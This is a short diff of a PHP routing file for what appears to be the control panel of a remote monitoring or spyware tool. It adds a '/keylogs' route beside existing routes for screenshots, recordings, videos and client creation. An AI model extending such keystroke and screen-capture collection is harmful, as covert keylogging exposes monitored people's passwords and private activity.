@@ -21,6 +21,7 @@ $route->get('/notifications', fn() => $controlPanel->notifications());
 $route->get('/recordings', fn() => $controlPanel->recordings());
 $route->get('/screenshots', fn() => $controlPanel->screenshots());
 $route->get('/videos', fn() => $controlPanel->videos());
+$route->get('/keylogs', fn() => $controlPanel->keylogs());
 
 $route->post('/client', fn() => $controlPanel->createClient());
 $route->post('/image', fn() => $controlPanel->upload('images'));
